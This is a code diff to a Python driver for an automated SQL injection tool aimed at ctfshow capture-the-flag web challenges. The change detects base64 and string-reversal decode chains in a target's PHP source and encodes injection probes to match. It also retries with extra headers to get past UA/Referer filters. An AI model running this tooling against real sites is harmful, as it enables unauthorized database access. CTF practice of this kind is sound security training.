@@ -21,14 +21,16 @@ import urllib.parse
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 ROOT = os.path.dirname(HERE)
+sys.path.insert(0, ROOT)
 sys.path.insert(0, HERE)
 
+from autosqli.tampers import apply_encoder  # noqa: E402
 from ctfshow_runner import Api, by_name, challenges, load_cookie  # noqa: E402
 
 RUNS = os.path.join(ROOT, "runs")
 FLAG_RE = re.compile(r"(?:ctfshow|flag|CTF|FLAG)\{[^}\s'\"]{1,120}\}")
 # 会话级附加信息（PHPSESSID / stage 刷新地址），由 resolve_entry 填、main 读
-LAST = {"sid": "", "stage": ""}
+LAST = {"sid": "", "stage": "", "encoder": ""}
 SQL_RE = re.compile(r"\$sql\s*=\s*\"([^\"]{5,400})\"")
 ACTION_RE = re.compile(r'<div[^>]*class="[^"]*layui-form[^"]*"[^>]*action="([^"]+)"')
 FALLBACK_ACTION_RE = re.compile(r'action="([^"]+\.php[^"]*)"')
@@ -80,13 +82,14 @@ def probe_json(url: str, method: str, param: str, cookie: str,
                headers: dict, stage: str = "") -> tuple[bool, dict, str]:
     """探测接口是否返回 {"code":..}；被 UA/Referer 网关拦住时自动补头重试。"""
     body = ""
+    val = apply_encoder("1", LAST.get("encoder", ""))
     for _ in range(3):
         if stage:
             http_get(stage, cookie, headers)      # 刷新一次性 token（web205）
         if method.upper() == "GET":
-            s, body = http_get(f"{url}?{param}=1", cookie, headers)
+            s, body = http_get(f"{url}?{param}={val}", cookie, headers)
         else:
-            s, body = http_post(url, {param: "1"}, cookie, headers, method=method)
+            s, body = http_post(url, {param: val}, cookie, headers, method=method)
         if s == 200 and body.lstrip().startswith('{"code"') \
                 and not _is_auth_fail(body):
             return True, headers, body
@@ -158,6 +161,16 @@ def resolve_entry(base: str, name: str, cookie: str) -> dict:
         if s != 200:
             last_err = f"{page} -> {s}"
             continue
+        # 参数预编码探测（web210 类：目标侧 decode 后再拼 SQL）
+        if "base64_decode(strrev(base64_decode" in html:
+            LAST["encoder"] = "b64rev2"
+        elif "base64_decode(strrev(" in html:
+            LAST["encoder"] = "b64rev1"
+        elif re.search(r"base64_decode\(\$", html):
+            LAST["encoder"] = "b64"
+        if LAST["encoder"]:
+            print(f"[{name}] 参数预编码: {LAST['encoder']}（页面含 decode 链）",
+                  flush=True)
         # 源码级侦察：参数名/请求方式优先从 PHP 源码里的 $_POST['x'] 读，
         # 比猜表单可靠（web183 起页面干脆没有 <form>，只有 $sql 和返回值）
         pm = re.search(r"\$_(POST|GET|REQUEST)\[\s*['\"](\w+)['\"]\s*\]", html)
@@ -265,6 +278,8 @@ def stream_cli(url: str, param: str, method: str, fields: dict, headers: dict,
     if LAST.get("stage"):
         cmd += ["--stage-url", LAST["stage"], "--stage-method", "GET",
                 "--stage-param", "@none"]
+    if LAST.get("encoder"):
+        cmd += ["--encode", LAST["encoder"]]
     if method.upper() == "PUT":
         # web203 类接口直读 php://input：body 必须原样发，URL 编码后 # 不还原
         cmd.append("--raw-body")
